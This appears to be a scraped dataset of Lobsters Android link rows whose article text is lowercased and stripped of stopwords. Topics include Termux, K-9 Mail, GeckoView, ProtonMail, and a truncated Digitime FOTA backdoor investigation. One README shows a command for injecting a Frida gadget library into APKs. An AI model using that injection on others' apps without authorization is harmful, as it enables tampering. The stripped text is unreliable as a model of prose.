superfluous nginx log access default log contain information need page requested time ip lead naturally second iteration second iteration nginx log parser nginx provides flexible perendpoint log log activated endpoint want damnfinecoffee deactivated everything else important internet full crawler annoyingly hit root path obviously count page view learned web also surprisingly full smartypants trying make way tplink admin also wanted ignore log provided data needed still needed transform data useful information found goaccess hacker news perhaps surprisingly worked box termux goaccess dashboard androidhosted data point could settle goaccess seem provide geo info always thought would cool feature kept working tool configured nginx print csvlike log wrote parser transforms log entry db entry geographic information provided excellent geocoder gem also annonymizes request ip using hashing final step adding cron entry run parser regularly point getting regular traffic converted row postgresql table still needed convenient way look data though third iteration adding viewer initially thought using grafana visualization tool free easy use flexible already familiar unfortunately grafana binary available termux issue open termux repo requesting feeling like trying compile manually thankfully found blazer gem similar concept compared grafana write sql query transforms chart exactly looking downside requires fullfledged rail application run okay tradeoff data look like right fourth iteration adding installation script far playing ear knew le reinstall project new device knew time memory would fade process would become painstaking trialanderror mess first compiled step needed work repo readme took total step get thing running noticing step could automated wrote setup script work tested separate android device make sure work hopefully work people well final architecture someone access one tracked page roughly happens javascript page call domain provided free duckdns duckdns translates address router recent ip router receives request us nat table redirect android phone android nginx receives request either log request come right place list tracked page nothing otherwise scheduled cron job rotates nginx log convert old log row postgresql table open myandroidlocalip desktop browser view chart map etc diagram show step le androidanalytics diagram named quite unimaginatively androidanalytics code setup instruction available github conclusion used google analytics analogy tool people familiar people immediately understand thing probably happen instead saying simple google analytics alternative said logbased web analytics tool saying google analytics replacement like saying bicycle replacement truck although transportation mode different every aspect thing sometimes really need truck lot time need get point point b bike enough fact probably better cheaper easier park carry around smaller environmental footprint project bike people need absolutely need use mammoth like google analytics personal blog pet project wasteful offering free data google exchange fancy dashboard play mseomasteratadcorpllc someone keep data course argue decentralized approach much safer probably ethical data monopoly single huge advertising company alternative competitor already discussed previous section processing power lying around free unused might well make better use smartphones amazing processing networking storage capability yet many reason turn old quickly translates getting sold best case shoved oblivion designated ejunk clutter drawer discarded sad tiny slab processing power could navigate man moon back thousand time seem quite find better occupation sitting dusty drawer year getting trashed even take little extra effort rather repurpose reuse something already subscribe fanciest new paas
34,Lobsters,android,Android,"Germany’s coronavirus contract tracing app is out today, and is open source",https://github.com/corona-warn-app,germany coronavirus contract tracing app today open source,grow team github sign repository issue need help issue need help package package package package used topic reload reload,dismiss grow team github github home million developer working together join grow development team manage permission collaborate project sign repository native android app using applegoogle exposure notification api kotlin issue need help updated aug native io app using exposure notification framework apple swift issue need help updated aug backend implementation applegoogle exposure notification api java updated aug html updated aug backend implementation verification process package java updated aug project overview general documentation white paper tex updated aug backend implementation test result information package java updated aug package freemarker updated jul frontend implementation verification process package java updated jul central repository collect community feature request improvement updated jul backlog item coronawarnapp updated jun coronawarnapp issue public hotline updated jun used topic perform action time signed another tab window reload refresh session signed another tab window reload refresh session
35,Lobsters,android,Android,A lightweight dex file parsing library,https://github.com/tboox/dexbox,lightweight dex file parsing library,become sponsor,dexbox lightweight dex file parsing library xmake run dexdump teststestsdex file castjava class cast super object method public void init register argument catch prologue invokedirect object init void returnvoid method public int main javalangstring register argument catch prologue sgetobject systemout printstream conststring test invokevirtual printstreamprintln string void sgetobject systemout printstream conststring test cast invokevirtual printstreamprintln string void sgetobject systemout printstream conststring invokevirtual printstreamprintln string void ff inttolong sgetobject systemout printstream newinstance stringbuilder invokedirect stringbuilder init void conststring num invokevirtual stringbuilderappend string stringbuilder moveresultobject invokevirtual stringbuilderappend long stringbuilder moveresultobject invokevirtual stringbuildertostring string moveresultobject invokevirtual printstreamprintln string void inttoshort sgetobject systemout printstream newinstance stringbuilder invokedirect stringbuilder init void conststring num invokevirtual stringbuilderappend string stringbuilder moveresultobject invokevirtual stringbuilderappend int stringbuilder moveresultobject invokevirtual stringbuildertostring string moveresultobject invokevirtual printstreamprintln string void inttochar sgetobject systemout printstream newinstance stringbuilder invokedirect stringbuilder init void conststring num invokevirtual stringbuilderappend string stringbuilder moveresultobject invokevirtual stringbuilderappend int stringbuilder moveresultobject invokevirtual stringbuildertostring string moveresultobject invokevirtual printstreamprintln string void inttobyte sgetobject systemout printstream newinstance stringbuilder invokedirect stringbuilder init void conststring num invokevirtual stringbuilderappend string stringbuilder moveresultobject invokevirtual stringbuilderappend int stringbuilder moveresultobject invokevirtual stringbuildertostring string moveresultobject invokevirtual printstreamprintln string void ffff ffff sgetobject systemout printstream newinstance stringbuilder invokedirect stringbuilder init void conststring num invokevirtual stringbuilderappend string stringbuilder moveresultobject longtoint invokevirtual stringbuilderappend int stringbuilder moveresultobject invokevirtual stringbuildertostring string moveresultobject invokevirtual printstreamprintln string void sgetobject systemout printstream conststring invokevirtual printstreamprintln string void sgetobject systemout printstream conststring test cast ok invokevirtual printstreamprintln string void return support project becoming sponsor logo show link website become sponsor
36,Lobsters,android,Android,What's up with K-9 Mail?,https://k9mail.app/2020/06/01/Whats-Up-With-K-9-Mail.html,mail,api level requirement people beta version else new website anxhelo lushka support forum fediverse fosstodonorg want help become beta tester donation via liberapay cketti github sponsor thank forum thread,release latest stable version mail september nearly two year ago course many wondering mail dead happy inform case work mail slow time never really stopped update app combination thing major factor api level requirement google play required u make change internals app order able publish update via play store time started long anticipated modernization user interface still lot work done people beta version end published beta version mail user interface state functionality accessible since released beta version app state ready daily usage feature available still missing time restore deliberately removed consider important enough justify maintenance burden would like release new stable version soon possible one feature remove without want ship new stable version app push imap idle added spend time focusing fixing bug reported beta tester release next stable version mail else new two year long time else new ask quite website website probably noticed look much nicer thanks anxhelo lushka redesigned website also fancy domain name support forum set support forum mail user help also use discussion everything related mail presence fediverse fosstodonorg also twitter made much use account yet plan least announce blog post new app release want help become beta tester help u find fix bug make stable version help create improve existing documentation user new developer want contribute project developer always welcome particular point time looking add new feature help fixing bug would certainly shorten time new stable release mean consider making donation via liberapay march cketti mail lead developer decided give working mail full time try mostly financed personal saving donation help prolong time able keep want also sponsor via github sponsor currently matching donation thank would like use opportunity say thank people regularly contribute mail developer translator user help user support question continually spread word mail year also lot people reported bug suggested feature improved translation developer fixed one bug annoyed year work accumulated big part make mail day thank finally thank everyone contributed financially question comment please let u know forum thread
37,Lobsters,android,Android,It’s 2020 and Android’s IPv6 Is Still Broken,http://lostintransit.se/2020/05/22/its-2020-and-androids-ipv6-is-still-broken/?doing_wp_cron=1590483464.2139940261840820312500,android still broken,rfc thing greenfield get start want support broken implementation think know better user spy serve ad sell data slaac work google one decide get dictate option android still broken,got interesting discussion twitter someone asked android getting support version o developed initially rfc idea forget learned design ground sound good theory ignores completely lesson learned mention thing greenfield almost network existing one get start shiny view end end connectivity everywhere slaac allowed get like saying wish war unfortunately people stupid war naivety similar teenager growing want change world realize world run money mega corp dirty politician whole mess led holy war slaac rdnss v please note slaac even initially option setting dns server basically meant partial implementation pretty useful dns initially microsoft operating system support slaac rdnss android want support meant support two operating system subnet much surprise android still broken implementation design going fix couple valid argument google lorenzo colitti pretty weak irony though people asking google willing implement think know better user happily spy serve ad sell data allowing run would disservice doubt slaac work work fairly large environment still mind better option fallacy many evangelist take ivory tower view ignoring business requirement business requirement compliance requirement need track host ip time also enterprise stupid thing fact google one decide get could course run slaac simultaneously read google thread see many people wasted lot time valid business reason want implemented ability assign suffix megacorpcomregister host dnskeep track host ip certain timeimage deployment via pxe think dhcp option dhcp option used example wlcability easily swap dns server entire network think umbrella deployment deployment want radius server see dhcp requestneed support ip phone sure workarounds use case point enterprise need google anyone else matter dictate option hand sadly even android still broken implementation
38,Lobsters,android,Android,Android 10 to render Termux unusable,https://github.com/termux/termux-packages/wiki/Termux-and-Android-10,android render termux unusable,summary http executepermission http issue going solved http converting deb apk demo http alternate solution additional note termux android issue,summary termux target api android due http executepermission untrusted apps target android invoke exec file within app home directory execution file writable app home directory wx violation apps load binary code embedded within app apk file november termux change package management solution met requirement new android selinux policy google play rule otherwise termux longer able receive application update issue discussion http accodring test xeffyr issue may affect user running lineage o rom issue going solved android o version higher requires executable code distributed within apk file convert deb file apk format placing file jni lib directory termux application automatically detect apks map jni file prefix symbolic link termux also provide tiny package manager help deal apks solution completely met requirement new android o also help separate userspace package installation make environment much easier recovery package data readonly apt package manager removed longer usable development done http converting deb apk demo sample package obtained http alternate solution know apkbased package distribution make termux nonconvenient unusable user discussion android solution enough time provide working one got suggestion using proot binary loader extremelly ridiculous variant like rewrite package wasm none decided make pull request implementation idea also make package maintaining impossible u picking apkbased packaging variant additional note termux user updating termux compiled application compiled face execve restriction device execve restricted even sdk termux build nt work termux compiled lose access shared storage sdcard due forced scoped storage termux api command termuxstorageget used retrieving file however save file private directory used lineage o rom android based restrict execve free access storage lost anyway tested engineering eng userdebug build access procnet restricted application utility like netstat working anymore lineage o restrict termux api termuxwifienable noop termux termux api compiled target sdk termux api termuxtelephonydeviceinfo show imei android issue
39,Lobsters,android,Android,A (Mostly) Google-Free Android,https://secluded.site/a-mostly-google-free-android/,mostly googlefree android,project motivation google entire business model really quite terrible launching censored search engine china selling ai tech u military mishandling sexual assault case forcing people onto google service sheer market dominance using redmi note pro miui aospextended lineageos open gapps microg mi band gadgetbridge fdroid linguee aurora like mail awesome idea kev quirk,let put little disclaimer right beginning use mobile phone lot people mileage vary also say mostly title incredibly difficult completely remove google android though project done good job short value privacy google far privacyfriendly get information algorithm capable extrapolating given enough data downright scary google entire business model addition company really quite terrible launching censored search engine china selling ai tech u military mishandling sexual assault case forcing people onto google service sheer market dominance like google want phone redmi note pro love specifically one thing like xiaomi business model exactly google collection incredibly easy circumvent xiaomi us miui meyoueye user tracking profiling also display ad lock screen elsewhere able seriously drop price phone almost sell hardware manufacturing cost circumventing data collection easy flashing rom prefer aospextended though lineageos much simpler cleaner android experience many installation guide tell flash open gapps package others say use microg much better decided even omit last time flashed phone thus absolutely compatibility google service apps break without well break also mi band give xiaomi ability collect plethora biometric data well use app instead like gadgetbridge fdroid occasionally want proprietary apps linguee englishgerman translation get aurora rather google play mentioned apps break without google service however find solidly minority proprietary application work perfectly fine without google service microg though get push notification really big deal moving minimal mobile experience thing desktop anyway closely related disclaimer top rarely use phone anything communication open source apps listening podcasts even email client installed would mail perfectly useable expect banking application work posted part awesome idea kev quirk want participate write something every day day post link social medium hashtag
40,Lobsters,android,Android,GeckoView for Android,https://mozilla.github.io/geckoview/,geckoview android,fullfeatured suited apps browser selfcontained standard compliant using geckoview api documentation information,android offer builtin webview application hook order display web page within context app however android webview really intended building browser hence many advanced web apis disabled furthermore also moving target different phone might different version webview app support geckoview come geckoview fullfeatured geckoview designed expose entire power web application straightforward api think harnessing full power gecko engine power firefox api webviewlike easy use suited apps browser geckoview particularly suited building mobile browser embedded web engine component kind app selfcontained geckoview standalone library bundle application confident code test code actually run standard compliant like firefox geckoview offer excellent support modern web standard using geckoview api documentation information
41,Lobsters,android,Android,Refactoring Android Themes with Style: Restructuring Themes,https://ataulm.com/2020/04/30/refactoring-themes-with-style.html,refactoring android theme style restructuring theme,nick butcher chris bane developing theme style monzo ideal theme structure app theme nightmode base theme platform theme resource qualifier framework theme nick rout describing migrate appcompat materialcomponents theme renaming pruning tree android styling theme v style migrating single base theme adding platform layer creating guarded alias next check emma chris,last year nick butcher chris bane presented developing theme style droidcon berlin welcome recap theme style well best practice android theming working apply best practice android app monzo u challenge lay could make change safely time word refactor theme ideal theme structure outside look feel monzo app pretty simple dark theme light theme well light theme dark toolbar actually turned three theme theme hierarchy looked follows square represents theme arrow show theme inherit checked usage always clear screen used particular variant another used app growing fast last count around activity fragment developed android engineer spread across multiple team ship new release every week understandable got position difficult aspect two tree meant reasonably easy add themerelated bug one tree went bug fix wanted something closer structure nick chris presented single tree four layer app theme base theme platform theme framework theme one specific purpose understanding help u keep theme tidy maintainable app theme bottom app theme apply activity level thememonzolight thememonzodark app theme mostly contain value colour attribute like colorprimary colorsurface android colorbackground example android colorbackground defined navy thememonzodark offwhite thememonzolight style name thememonzolight parent basethememonzo item name android colorbackground coloroffwhite item item name coloronbackground colornavy item item name colorsurface colorwhite item item name coloronsurface colornavy item item name colorprimary coloroffwhite item item name coloronprimary colornavy item style style name thememonzodark parent basethememonzo item name android colorbackground colornavy item item name coloronbackground colorwhite item item name colorsurface colordarkgrey item item name coloronsurface colorwhite item item name colorprimary colornavy item item name coloronprimary colorwhite item style view layout reference colour attribute theme adding nightmode app becomes trivial override app theme valuesnight resource directory different set colour value base theme base theme basethememonzo override define default style view text appearance attribute layer generally contain reference specific colour instead style resource used reference attribute app theme style name basethememonzo parent platformthememonzo item name tabstyle stylewidgetmonzotablayoutlegacy item item name textinputstyle stylewidgetmonzotextinputlayout item item name toolbarstyle stylewidgetmonzotoolbar item style avoiding use hardcoded colour layer mean everything common theme go platform theme platform theme layer allows u account api specific attribute using resource qualifier specify different platform theme different version android xml version encoding resource style name parent attribute available api style style name platformthememonzo parent resource resvaluesthemesxml xml version encoding resource style name parent themematerialcomponentslightnoactionbar style name platformthememonzo parent resource work based following principle base theme depends platformthememonzo platformthememonzo defined resource bucket need versionspecific attribute instance platformthememonzo depends versionspecific theme resource eg versionspecific theme resource inherit older versionspecific resource unless minsdkversion case depend framework theme framework theme chose themematerialcomponentslightnoactionbar framework theme inherit framework theme provides lot sensible default specify everything nick rout wrote article describing migrate appcompat materialcomponents theme showcase thing get free inheriting framework theme rather creating scratch structure looking get step take help u renaming pruning tree many theme style difficult know start part difficulty lay fact clear theme used always clear style resource theme decided adopt strict naming convention help u navigate current state app first rule agreed take advantage dot notation possible reserving usage explicit parent two case declaring theme overlay want inherit attribute changing namespaces inheriting style different family made really easy see lineage theme removing indirection grouped theme family made easier reduce number theme using projectwide find replace replacing lightstatusbarlighttoolbar variant lighttoolbar light toolbar status bar ought light anyway detangling left theme made easier adopting naming prefix thememonzo app theme themeoverlaymonzo theme overlay widgetmonzo widget theme theme overlay style distinct concept android represented style resource stricter name mean resource le chance misused information difference theme style check android styling theme v style migrating single base theme although renaming resource collapsing similar theme help reduce hierarchy manageable number understandable theme still need collapse multitree setup one multiple tree mean duplicate attribute base tree problematic still issue would easy make change one forget fastest way forward merge base root app theme tree moving attribute base corresponding root app theme reparent thememonzodark thememonzolight new empty base reparenting theme introduce unexpected bug case careful check usage thememonzodark depend colourspecific attribute themematerialcomponentsdark component might changed colour reparented theme descendent themematerialcomponentslight monzo app often used light themed component theme eg dialog popup menu meant attribute overridden force light style anyway meant major regression adding platform layer got single tree possible u add platform layer help u handle specific attribute android windowlightstatusbar android windowlightnavigationbar available api respectively inform system whether status bar navigation bar light system choose provide light dark icon attribute set isolation relate android statusbarcolor android navigationbarcolor even though available older api version want set separately one instead create custom theme attribute abstraction creating guarded alias creating custom theme attribute case declaring attribute resource value resource file name format xml version encoding resource attr name preferredstatusbarcolor format color attr name preferdarkstatusbaricons format boolean resource use app theme like theme attribute style name thememonzolight parent basethememonzo item name preferredstatusbarcolor coloroffwhitedarker item item name preferdarkstatusbaricons true item style style name thememonzodark parent basethememonzo item name preferredstatusbarcolor colornavydarker item item name preferdarkstatusbaricons false item style anything except assign value attribute put platformspecific theme ensure set attribute meant coupled like android windowlightstatusbar android statusbarcolor together xml version encoding resource style name parent control whether status bar icon lightdark minsdkversion item name android windowlightstatusbar attrpreferdarkstatusbaricons item available set alongside avoid hardtoread icon item name android statusbarcolor attrpreferredstatusbarcolor item style style name platformthememonzo parent resource status bar attribute set together configurable app theme next look default style help u deduplicate code improve consistency strengthen theme check meantime please let know found post helpful comment question correction let know twitter thanks emma chris review
42,Lobsters,android,Android,A static injector of dynamic library for application,https://github.com/lanoox/luject,static injector dynamic library application,luject introduction 中文 prerequisite build installation usage example inject libfridagadgetso apk frida use frida nonrooted device development build run build run test contact backer become backer sponsor become sponsor,luject static injector dynamic library application introduction 中文 luject static injector dynamic library application support following application android apk iphoneos ipa window program supported yet linux program macos program want know please refer prerequisite xmake installed system available build installation usage luject appapk luject appipa luject libaso luject appexe luject adll luject libadylib luject bin example inject libfridagadgetso apk use frida tool dynamically analyze application detail see frida luject appapk p libtest tmplibfridagadgetso libtest library requires matching injection apk support pattern matching achieve batch injection example libtest specify p parameter defaulted batch full injection ref use frida nonrooted device development build run xmake xmake run luject input libaso libbso build run test xmake build test xmake run test contact backer thank backer become backer sponsor support project becoming sponsor logo show link website become sponsor
44,Lobsters,android,Android,"All ProtonMail apps are now open source, as Android joins the list",https://protonmail.com/blog/android-open-source/,protonmail apps open source android join list,protect keep data private web app open source io app open source bridge app open source protonvpn apps open source mean proton apps beta open source github page sec consult full audit report open source proton open sourcing code increase security apps bug bounty program activist journalist open source code contributes free internet openpgpjs gopenpgp contact protonmailcom,starting today every app use access protonmail inbox open source passed independent security audit one guiding principle transparency deserve know product protect keep data private believe level transparency way earn trust community end open source long priority proton web app open source since io app open source desktop bridge app open source protonvpn apps open source mean proton apps beta open source today add protonmail android app list code available github page part making android app open source commissioned independent security audit sec consult audit found app outstanding vulnerability also published full audit report website open source proton safety number one priority open sourcing code increase security apps allows u leverage entire security community search vulnerability discover vulnerability may eligible bug bounty program mean activist journalist rely service confident communication remain private open source code contributes free internet goal bring security privacy freedom internet strong supporter open source community maintain two open source cryptographic library openpgpjs gopenpgp make easier developer encrypt apps thus protect data cooperation among open source developer create sustain privacy tech ecosystem necessary create safer internet thank community supporting effort look forward feedback github directly via email contact protonmailcom get free secure email account protonmail also provide free vpn service protect privacy protonmail protonvpn funded community contribution would like support development effort upgrade paid plan donate thank support
45,Lobsters,android,Android,Which is better on Android: divide by 2 or shift by 1?,https://jakewharton.com/which-is-better-on-android-divide-by-two-or-shift-by-one/,better android divide shift,better android divide shift androidx collection library anyone optimize javac kotlinc methodlocal optimization art shift faster division jetpack benchmark use information save apk size issue unsigned number poweroftwo division use shift issue issue,better android divide shift april porting androidx collection library kotlin multiplatform experiment binary compatibility performance tooling different memory model data structure library use arraybased binary tree store element java code lot shift replace poweroftwo multiplication divide ported kotlin turn slightlyawkward infix operator obfuscate intent code sampled people bitwise shift v multiplicationdivision many heard anecdotal claim shift better performance everyone remained skeptical whether true assumed one compiler seen code ran cpu would handle optimizing case effort satisfy curiosity partially avoid infix bitwise operator set answer better related question go anyone optimize three major compiler code pass hit cpu javackotlinc art opportunity optimize javac class example static int multiply int value return value static int divide int value return value static int shiftleft int value return value static int shiftright int value return value java compiled javac jdk resulting bytecode displayed javap javac examplejava javap c example compiled examplejava class example static int multiply int code imul ireturn static int divide int code idiv ireturn static int shiftleft int code ishl ireturn static int shiftright int code ishr ireturn every method start load first argument value multiply divide method load constant value run imul idiv perform integer multiplication integer division respectively shift method load constant value ishl ishr integer shift left integer shift right respectively optimization know anything java unexpected javac optimizing compiler leaf majority work runtime compiler jvm aheadoftime compiler kotlinc fun multiply value int value fun divide value int value fun shiftleft value int value shl fun shiftright value int value shr kotlin compiled java bytecode kotlinc kotlin javap tool used kotlinc examplekt javap c examplekt compiled examplekt public final class examplekt public static final int multiply int code imul ireturn public static final int divide int code idiv ireturn public static final int shiftleft int code ishl ireturn public static final int shiftright int code ishr ireturn exactly output java using original jvm backend kotlin using forthcoming irbased backend via xuseir also produce output use java bytecode output kotlin example input latest built master sha time writing java jar release output examplektclass dexdump classesdex opened classesdex dex version class class descriptor lexamplekt access flag public final superclass ljavalangobject direct method lexamplekt name divide type access public static final code examplektdivide int return lexamplekt name multiply type access public static final code examplektmultiply int return lexamplekt name shiftleft type access public static final code examplektshiftleft int return lexamplekt name shiftright type access public static final code examplektshiftright int return note output slightly trimmed dalvik bytecode registerbased instead stackbased like java bytecode result method one real bytecode associated integer operation us register first argument value integer literal change behavior optimizing compiler although methodlocal optimization run need define rule order keep method removed keep allowoptimization class examplekt method rule passed pgconf also supply android apis link using lib java jar lib release pgconf rulestxt output examplektclass dexdump classesdex opened classesdex dex version class class descriptor lexamplekt access flag public final superclass ljavalangobject direct method lexamplekt name divide type access public static final code examplektdivide int return lexamplekt name multiply type access public static final code examplektmultiply int return lexamplekt name shiftleft type access public static final code examplektshiftleft int return lexamplekt name shiftright type access public static final code examplektshiftright int return exact output art use dalvik bytecode output example input art running android emulator adb push classesdex sdcardclassesdex adb shell su dexfilesdcardclassesdex oatfilesdcardclassesoat oatdump oatfilesdcardclassesoat oatdexfile lexamplekt initialized oatclassallcompiled int examplektdivide int code mov eax ecx lea edx eax test eax eax cmovnlge edx eax sar edx mov eax edx ret int examplektmultiply int code shl ecx mov eax ecx ret int examplektshiftleft int code shl ecx mov eax ecx ret int examplektshiftright int code sar ecx mov eax ecx ret note output significantly trimmed assembly reveals art indeed stepped normalized arithmetic operation use shift first multiply shiftleft exact implementation use shl left bitwise shift ofâ beyond look offset file leftmost column actually art recognized function body compiled assembly deduplicated next divide shiftright share use sar right bitwise shift ofâ four additional instruction divide precede sar handle case input negative adding value running command pixel running android show art compiles code arm assembly oatdexfile lexamplekt verified oatclassallcompiled int examplektdivide int code lsrs add asrs mov bx lr int examplektmultiply int code lsls bx lr int examplektshiftleft int code lsls bx lr int examplektshiftright int code asrs bx lr multiply shiftleft use lsls left shift deduplicated shiftright us asrs right shift divide also using asrs right shift us another right shift lsrs handle adding negative value definitively say replacing value value offer benefit stop arithmetic operation reserve strictly bitwise thing however value value still produce different assembly instruction thus presumably different performance characteristic thankfully value avoids using generic division still primarily based right shift likely far apart term performance shift faster division determine whether divide shift faster use jetpack benchmark library class divideorshifttest jvmfield rule val benchmark benchmarkrule test fun divide val value toint ensure constant var result benchmarkmeasurerepeated result value println result ensure keep computation test fun shift val value toint ensure constant var result benchmarkmeasurerepeated result value shr println result ensure keep computation device armbased pixel running android result n divideorshifttestdivide n divideorshifttestshift effectively zero difference using division versus shift number small nanosecond using negative number show difference result definitely say replacing value value offer benefit stop arithmetic operation reserve strictly bitwise thing use information save apk size given two different way express operation choose one better performance performance choose whichever result smaller apk size know value value produce assembly art thus one spaceefficient dalvik bytecode unconditionally rewrite smaller form looking output produce size bytecode lexamplekt name multiply int lexamplekt name shiftleft int gain power multiplication run bytecode space shift storing literal value value compared value lexamplekt name multiply const float mulint lexamplekt name shiftleft int filed issue investigate optimizing automatically strongly suspect case applies near zero likely worthwhile output also tell u value value cost term dalvik bytecode lexamplekt name divide int lexamplekt name shiftleft int also diverge bytecode size literal reach unconditionally replacing poweroftwo division right shift never safe behavior around negative could replacement value guaranteed nonnegative track possible range integer value time unsigned number poweroftwo division use shift java bytecode lack unsigned number emulate using signed counterpart java static helper method operating signed type unsigned value kotlin offer type like uint similar thing completely abstracted behind type conceivable using division poweroftwo could rewritten shift use kotlin model case fun javalike value int integerdivideunsigned value fun kotlinlike value uint value case look code compiled start plain kotlinc kotlin kotlinc examplekt javap c examplekt compiled examplekt public final class examplekt public static final int javalike int code invokestatic method javalangintegerdivideunsigned ii ireturn public static final int int code invokestatic method kotlinunsignedkt ii ireturn kotlin recognize poweroftwo division could use iushr bytecode filed track adding behavior using xuseir change anything except remove loadstore noise however targeting java kotlinc jvmtarget examplekt javap c examplekt compiled examplekt public final class examplekt public static final int javalike int code invokestatic method javalangintegerdivideunsigned ii ireturn public static final int int code invokestatic method javalangintegerdivideunsigned ii ireturn integerdivideunsigned method available java prefered targeting newer since make function body identical revert back old output see happens comparison next notably different invoked include kotlin stdlib input also pas minapi since integerdivideunsigned available api newer java jar lib minapi release pgconf rulestxt output examplektclass kotlinstdlibjar dexdump classesdex opened classesdex dex version class class descriptor lexamplekt access flag public final superclass ljavalangobject direct method lexamplekt name javalike type access public static final code examplektjavalike int invokestatic ljavalanginteger divideunsigned ii method moveresult return lexamplekt name type access public static final code inttolong ffff ffff constwide double int inttolong longtoint return kotlin unsigned integer division implementation inlined function convert input argument literal longs performs long division convert back int eventually run art translated equivalent going leave function behind opportunity optimization already missed java version failed replace divideunsigned call shift filed issue track last opportunity optimize case art adb push classesdex sdcardclassesdex adb shell su dexfilesdcardclassesdex oatfilesdcardclassesoat oatdump oatfilesdcardclassesoat oatdexfile lexamplekt initialized oatclassallcompiled int examplektjavalike int code test eax esp stackmap push ebp sub esp mov esp eax cmpw f stateandflags jnzne call pop ebp mov edx mov eax ebp call eax stackmap add esp pop ebp ret call f ptestsuspend stackmap ebde jmp int int code art intrinsify call divideunsigned instead get machinery jump regular method implementation filed issue track adding art intrinsics unsigned divide well certainly journey congrats made far scrolled bottom summarize art rewrite poweroftwo multiplication left shift poweroftwo division right shift extra instruction handle negative observable performance difference right shift poweroftwo division size difference dalvik bytecode shift multiplydivide nobody optimizes unsigned division yet probably using anyway fact answer title post better android divide shift neither use division arithmetic use shift actual bitwise operation switching androidx collection port shift multiply divide see next time jake wharton
46,Lobsters,android,Android,A gradle plugin that integrates xmake seamlessly,https://github.com/xmake-io/xmake-gradle,gradle plugin integrates xmake seamlessly,xmakegradle introduction 中文 prerequisite apply plugin plugins dsl legacy plugin application configuation simplest example buildgradle jni gradle configuations build build jni generate apk force rebuild jni development build plugins publish plugins http guidesgradleorgpublishingpluginstogradlepluginportal contact backer become backer sponsor become sponsor,xmakegradle gradle plugin integrates xmake seamlessly introduction 中文 xmakegradle gradle plugin integrates xmake seamlessly want know please refer prerequisite xmake installed system available apply plugin plugins dsl plugins id orgtbooxgradlexmakeplugin version legacy plugin application buildscript repository maven url http dependency classpath orgtboox repository mavencentral apply plugin orgtbooxgradlexmakeplugin configuation simplest example add xmakelua projectdirjnixmakelua enable xmake buildgradle buildgradle android externalnativebuild xmake path jnixmakelua jni jni project structure projectdir src main java jni xmakelua cpp xmakelua addrules modedebug moderelease target nativelib setkind shared addfiles nativelibcc gradle configuations android defaultconfig externalnativebuild xmake append global cflags optional cflags dtest append global cppflags optional cppflags dtest switch build mode debug xmake f debug optional buildmode debug set abi filter optional eg armeabi also get abifilters defaultconfigndkabifilters abifilters set built target target xxx yyy externalnativebuild xmake enable xmake set xmakelua project file path path jnixmakelua enable verbose output optional eg verbose warning normal loglevel verbose set cstl optional eg cstaticcshared gnustlstaticgnustlshared stlportstaticstlportshared stl cshared set given xmake program path optional program usrlocalbinxmake disable stdc library optional stdcxx false set given ndk directory path optional ndk set sdk version ndk optional sdkver build build jni generate apk xmakebuild injected assemble task automatically gradlexmakeplugin applied gradlew app assembledebug task nativelib task nativelib xmake build ccache compilingdebug nativelibcc linkingdebug libnativelibso build ok install artifact task nativelib task nativelib xmake build ccache compilingdebug nativelibcc linkingdebug libnativelibso build ok install artifact task nativelib prebuild task nativelib assemble task app assembledebug force rebuild jni gradlew nativelib xmakerebuild development build plugins gradlew gradlexmakeplugin assemble publish plugins see http guidesgradleorgpublishingpluginstogradlepluginportal gradlew gradlexmakeplugin publishplugins contact backer thank backer become backer sponsor support project becoming sponsor logo show link website become sponsor
47,Lobsters,android,Android,Privacy-Preserving Contact Tracing - Apple and Google,https://www.apple.com/covid19/contacttracing,privacypreserving contact tracing apple google,privacypreserving contact tracing,privacypreserving contact tracing across world government health authority working together find solution pandemic protect people get society back running software developer contributing crafting technical tool help combat virus save life spirit collaboration google apple announcing joint effort enable use bluetooth technology help government health agency reduce spread virus user privacy security central design part partnership google apple releasing draft documentation exposure notification system service privacypreserving contact tracing u apple google believe never important moment work together solve one pressing problem close cooperation collaboration developer government public health provider hope harness power technology help country around world slow spread accelerate return everyday life
48,Lobsters,android,Android,"Dark Sky Acquired by Apple, announced plans to shut down outside of iOS",https://blog.darksky.net/dark-sky-has-a-new-home/,dark sky acquired apple announced plan shut outside io,update update happens existing product purchase app store thank,adam grossman august update android wear o apps shut august subscriber active time receiving full refund weather forecast map dark sky website remain active adam grossman july update service existing user subscriber android app continue august point app shut subscriber active time receive full refund weather forecast map embeds available dark sky website also shut august adam grossman march today important exciting news share dark sky joined apple goal always provide world best weather information possible help many people stay dry safe way respect privacy better place accomplish goal apple thrilled opportunity reach far people far impact ever could alone happens existing product io app change dark sky io time continue available purchase app store android wear o app app longer available download service existing user subscriber continue july point app shut subscriber still active time receive refund website weather forecast map embeds continue july website remain active beyond time support api io app customer api api service existing customer changing today longer accept new signups api continue function end part transition use dark sky apple subject apple privacy policy found applecomprivacy thank customer family friend grateful support past eight year look forward continuing build great product stay dark sky team
49,Lobsters,android,Android,Researching Digitime Android Backdoors,https://wuffs.org/blog/digitime-tech-fota-backdoors,researching digitime android backdoor,researching digitime tech fota backdoor background research fota updater cosmo communicator update digitime fota updaters http systemfota april unpacking lua boot module boot c c scheduling boot c c checkin boot c c registration boot c c info boot c c upgrade boot aidl lua worker initialisation worker c c device id worker c c scheduling worker c c checkin worker c c info gathering worker c c package control worker c c backdoor foslenhance backdoor iorgx backdoor iorgy backdoor iorgz security implication malware linked digitime koodous thread xda developer next discovered similar situation ninji update http securitytrailscomdomainwwwdigitimetechcomhistorya shade grey building emulator,researching digitime tech fota backdoor published dec investigation shady stuff going behind digitime tech fota update service seen planet computer android device lowbudget android hardware background earlier month wrote research fota updater cosmo communicator wanting learn fetched update hope gleaning information device getting raw ota update file sent absurd rabbit hole went assuming good faith discover updater contained curious level obfuscation complexity thing theory simple straightforward pattern reminiscent malware attained goal writing script could pretend cosmo fetch ota data still left lot question unanswered though delved post contains everything learned digitime operation based research company currentlyoperating online service every sample could track software distribution model make difficult get sample bound aspect missed still enough information get broad overview update please see note end post detail situation progressed summary planet computer entirely unaware started internal investigation immediately notified working mitigationsalternatives digitime shenzhen digitime technology 数联时代 digitime technology company based shenzhen operates mobile device update infrastructure main website wwwdigitimetechcom boast globally leading fota service provider million device scrolling image carousel claim partnership qualcomm mediatek spreadtrum soc vendor revoview waterworld bird device manufacturer although definitely exhaustive list u page claim digitime serf hundred worldwide android terminal r company odms brand closely linked qiming iot 启明智物 深圳市启明智物科技有限公司 also advertise fota service wwwqimingiotcom contact phone number digitime even share legal representative much younger registered company guangdong province november domain name registered month later fota updaters digitime main business least public eye fota service advertise digitimetechcom aspect visible user provide android odmsoems systemfota updater apk instruction build ota package web portal 